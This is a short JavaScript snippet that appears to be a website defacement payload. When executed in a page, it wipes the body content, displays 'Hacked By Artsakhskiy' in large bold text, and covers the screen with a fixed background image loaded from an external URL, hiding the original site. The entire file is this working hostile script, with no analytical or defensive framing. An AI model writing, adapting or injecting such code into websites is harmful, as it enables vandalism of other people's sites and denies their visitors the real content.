(function () {

    const body = document.body;
    const bodyChildren = document.querySelectorAll('body');

    bodyChildren.forEach((element) => {
        element.innerHTML = "Hacked By Artsakhskiy";
        element.style.fontWeight = "bold";
        element.style.color = "white";
        element.style.fontSize = "40px";
    });

    body.style.background = 'url("https://i.pinimg.com/originals/d0/52/00/d05200200dc4c9a9dfa0dca9fb9fbdb5.jpg"), black';
    body.style.backgroundPosition = 'center';
    body.style.backgroundRepeat = 'no-repeat';
    body.style.backgroundSize = 'cover';
    body.style.backgroundAttachment = 'fixed';
    body.style.zIndex = '999999';
    body.style.position = 'fixed';
    body.style.margin = '0';
    body.style.padding = '0';
    body.style.left = '0';
    body.style.top = '0';
    body.style.width = '100%';
    body.style.height = '100%';
    body.style.overflow = 'hidden';

}());